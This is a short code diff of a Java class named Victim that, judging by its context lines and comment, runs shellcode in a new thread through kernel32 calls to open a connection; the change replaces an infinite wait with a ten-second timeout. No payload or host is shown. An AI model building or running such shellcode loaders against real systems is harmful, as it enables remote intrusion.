@@ -36,7 +36,7 @@ public class Victim {
             long threadHandle = k32.CreateThread(0, 0, address, 0, 0, 0);
 
             // Wait for shellcode to establish connection
-            k32.WaitForSingleObject(threadHandle, -1);
+            k32.WaitForSingleObject(threadHandle, 10000);
 
         } catch (Exception e) {
             e.printStackTrace();
